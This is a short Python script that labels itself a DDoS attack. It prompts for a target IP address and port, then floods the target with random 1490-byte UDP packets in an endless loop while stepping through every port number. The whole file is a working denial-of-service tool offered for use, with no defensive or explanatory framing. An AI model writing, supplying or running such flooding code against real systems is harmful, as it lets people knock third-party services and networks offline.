import socket, random

IP, port = input("IP Target: "), int(input("Port: "))

socket_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
random_bytes = random._urandom(1490)

print("DDoS Attack is running...\nCTRL-C to exit.")
while True:
    try:
        socket_server.sendto(random_bytes, (IP, port))
        port = port + 1 if port < 65534 else 1
    except:
        print("\n<LOG>: DDoS attack is finished.")
        socket_server.close()
        break
